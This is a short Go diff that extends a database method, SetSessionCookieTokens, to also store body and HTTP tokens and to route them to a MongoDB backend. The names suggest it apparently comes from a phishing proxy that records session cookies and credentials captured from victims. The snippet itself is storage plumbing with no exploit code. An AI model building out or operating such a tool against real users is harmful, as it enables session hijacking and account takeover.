@@ -64,9 +64,11 @@ func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) er
 	return err
 }
 
-func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	err := d.sessionsUpdateCookieTokens(sid, tokens)
-	return err
+func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
+	if mongoDb, ok := d.db.(*MongoDatabase); ok {
+		return mongoDb.SetSessionCookieTokens(sid, tokens, bodyTokens, httpTokens)
+	}
+	return d.sessionsUpdateCookieTokens(sid, tokens)
 }
 
 func (d *Database) SetSessionCountryInfo(sid string, countryCode string, country string) error {
